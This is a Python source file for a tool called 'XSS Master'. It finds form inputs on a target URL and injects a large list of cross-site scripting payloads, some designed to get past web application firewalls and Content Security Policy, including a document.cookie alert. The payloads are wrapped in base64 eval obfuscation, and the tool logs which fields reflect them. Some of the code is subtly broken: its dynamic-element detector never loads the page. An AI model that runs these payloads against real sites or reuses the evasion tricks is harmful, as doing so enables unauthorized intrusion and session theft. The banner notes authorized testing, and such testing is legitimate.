import requests
from bs4 import BeautifulSoup
import re
import json
import csv
import threading
import time
import random
import logging
from concurrent.futures import ThreadPoolExecutor
import os
import base64
from selenium import webdriver
from selenium.webdriver.firefox.options import Options  # Updated for Firefox
from selenium.webdriver.firefox.service import Service  # Import the Service class
import pyfiglet
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from urllib.parse import urlparse, parse_qsl  


logging.basicConfig(filename='xss_scan.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

console = Console()

def display_banner():
    banner_text = pyfiglet.figlet_format("XSS Master", font="slant")
    console.print(banner_text, style="bold cyan")
    console.print(Panel("Developed by [bold magenta]cbhunter[/bold magenta]\n"
                        "For authorized testing only.", style="bold white on blue"))

# Function to display a summary table
def display_summary_table(url, input_fields):
    table = Table(title="Scan Summary", style="bold green")
    table.add_column("Field", justify="left")
    table.add_column("Value", justify="left")
    table.add_row("Target URL", url)
    table.add_row("Input Fields Found", str(len(input_fields)))
    console.print(table)

def rate_limit(delay=1, max_delay=5):
    time.sleep(delay + random.uniform(0, max_delay))  

def check_rate_limit(response):
    if 'Retry-After' in response.headers:
        delay = int(response.headers['Retry-After'])
        logging.warning(f"Rate limit detected. Retrying after {delay} seconds.")
        time.sleep(delay)


def inject_payloads(input_fields, payloads, session, url, params=None):
    log_file = 'xss_scan_logs.txt'  
    with open(log_file, 'a') as log:
        for field in input_fields:
            logging.info(f"Injecting payloads into {field['name']}")
            for payload in payloads:
                try:
                    
                    obfuscated_payload = base64.b64encode(payload.encode()).decode()
                    eval_payload = f"<script>eval(atob('{obfuscated_payload}'))</script>"

                    response = submit_payload(field['name'], eval_payload, session, url, params)
                    if eval_payload in response.text:
                        outcome = "SUCCESS: Reflected XSS"
                        logging.info(f"{outcome} in {field['name']} with payload: {payload}")
                        save_vulnerability(field['name'], eval_payload, url, params)
                    else:
                        outcome = "FAILURE: Not Reflected"
                  
                    log.write(f"Input Field: {field['name']}\n")
                    log.write(f"Payload: {payload}\n")
                    log.write(f"Outcome: {outcome}\n")
                    log.write("="*40 + "\n")

                except requests.exceptions.RequestException as e:
                    logging.error(f"Request failed for {field['name']} with payload {payload}: {e}")
                    log.write(f"Input Field: {field['name']}\n")
                    log.write(f"Payload: {payload}\n")
                    log.write(f"Outcome: ERROR: {str(e)}\n")
                    log.write("="*40 + "\n")
                    rate_limit()



def submit_payload(input_name, payload, session, url, params=None):
    data = {input_name: payload}
    if params:
        response = session.get(url, params=params, data=data)
    else:
        response = session.post(url, data=data)
    check_rate_limit(response)
    return response

def find_input_fields(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        input_fields = []

        for form in soup.find_all('form'):
            for input_tag in form.find_all('input'):
                if input_tag.get('type') != 'hidden':
                    input_fields.append(input_tag)

        return input_fields
    except requests.exceptions.RequestException as e:
        logging.error(f"Error finding input fields for {url}: {e}")
        return []


def generate_payloads():
    base_payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)></iframe>",
        "<a href='javascript:alert(1)'>Click Me</a>",
        "<script>alert(document.cookie)</script>",
        "';alert(String.fromCharCode(88,83,83))//",
        "\";alert(String.fromCharCode(88,83,83))//",
        "</script><script>alert(1)</script>",
        "><script>alert(1)</script>",
    ]

    waf_bypass_payloads = [
        "<sCrIpT>alert('XSS')</ScRiPt>",  
        "<scr<script>ipt>alert(1)</scr<script>ipt>",  
        "' onfocus=alert(1) autofocus='true'>",  
        "<img src=x oNErrOR=alert(1)>",  
        "<svg onload='alert(\"XSS\")'>",  
        "<scr&#x69pt>alert(1)</scr&#x69pt>", 
    ]

    csp_bypass_payloads = [
        "<script nonce=\"random\">alert(1)</script>",  
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline';\">",
        "<script src='data:text/javascript,alert(1)'></script>", 
        "<script src='https://trusted-site.com/'></script><script>alert(1)</script>",  
    ]

    context_sensitive_payloads = [
        "';alert(1);//",  
        "\";alert(1);//",  
        "');alert(1);//", 
        "' onmouseover=alert(1) '",  
        "javascript:alert(1)",  
        "<!--<script>alert(1)//-->", 
    ]

    all_payloads = base_payloads + waf_bypass_payloads + csp_bypass_payloads + context_sensitive_payloads
    obfuscated_payloads = []

    for payload in all_payloads:
        obfuscated_payloads.append(payload)
        obfuscated_payloads.append(f"<!--{payload}-->")  # Comment-based evasion
        obfuscated_payloads.append(payload.replace("<", "%3C").replace(">", "%3E"))  # HTML-encoded
        obfuscated_payloads.append(base64.b64encode(payload.encode()).decode())  # Base64-encoded
        obfuscated_payloads.append(payload.replace("<", "&lt;").replace(">", "&gt;"))  # Double encoding
        obfuscated_payloads.append(f"<script>setTimeout(function(){{ {payload} }}, 1000);</script>")  # setTimeout obfuscation

    return obfuscated_payloads


def create_session(url):
    session = requests.Session()
    headers = {
        'User-Agent': random.choice(["Mozilla/5.0", "Safari/537.36", "Chrome/91.0"]),
        'Connection': 'keep-alive'
    }
    session.headers.update(headers)
    response = session.get(url)
    csrf_token = extract_csrf_token(response.text)
    if csrf_token:
        session.headers.update({'X-CSRF-TOKEN': csrf_token})
    return session


def extract_csrf_token(html):
    soup = BeautifulSoup(html, 'html.parser')
    token = soup.find('meta', attrs={'name': 'csrf-token'})
    return token['content'] if token else None


def detect_dynamic_elements(url):
    options = Options()
    options.headless = True  
    service = Service('/usr/local/bin/geckodriver')  

    driver = webdriver.Firefox(service=service, options=options)  
    
    dynamic_content = driver.page_source
    driver.quit()
    
    soup = BeautifulSoup(dynamic_content, 'html.parser')
    input_fields = []
    for form in soup.find_all('form'):
        for input_tag in form.find_all('input'):
            if input_tag.get('type') != 'hidden':
                input_fields.append(input_tag)

    return input_fields


def detect_url_params(url):
    parsed_url = urlparse(url)
    params = dict(parse_qsl(parsed_url.query))
    return params if params else None


def save_vulnerability(input_name, payload, url, params=None):
    result = {
        "input_name": input_name,
        "payload": payload,
        "url": url,
        "params": params
    }
    try:
        base_path = os.path.dirname(os.path.abspath(__file__))  
        vulnerabilities_path = os.path.join(base_path, 'vulnerabilities')
        os.makedirs(vulnerabilities_path, exist_ok=True)
        
        json_file = os.path.join(vulnerabilities_path, 'vulnerabilities.json')
        with open(json_file, 'a') as f:
            json.dump(result, f)
            f.write('\n')

        csv_file = os.path.join(vulnerabilities_path, 'vulnerabilities.csv')
        with open(csv_file, 'a') as f:
            writer = csv.DictWriter(f, fieldnames=result.keys())
            writer.writerow(result)

        logging.info(f"Saved vulnerability to {vulnerabilities_path}")
    except Exception as e:
        logging.error(f"Error saving vulnerability: {e}")


def main():
    display_banner()
    target_url = input("Enter the target URL: ").strip()

    params = detect_url_params(target_url)
    input_fields = find_input_fields(target_url)
    payloads = generate_payloads()
    session = create_session(target_url)

    display_summary_table(target_url, input_fields)

    if params:
        inject_payloads(input_fields, payloads, session, target_url, params=params)
    else:
        inject_payloads(input_fields, payloads, session, target_url)

if __name__ == "__main__":
    main()
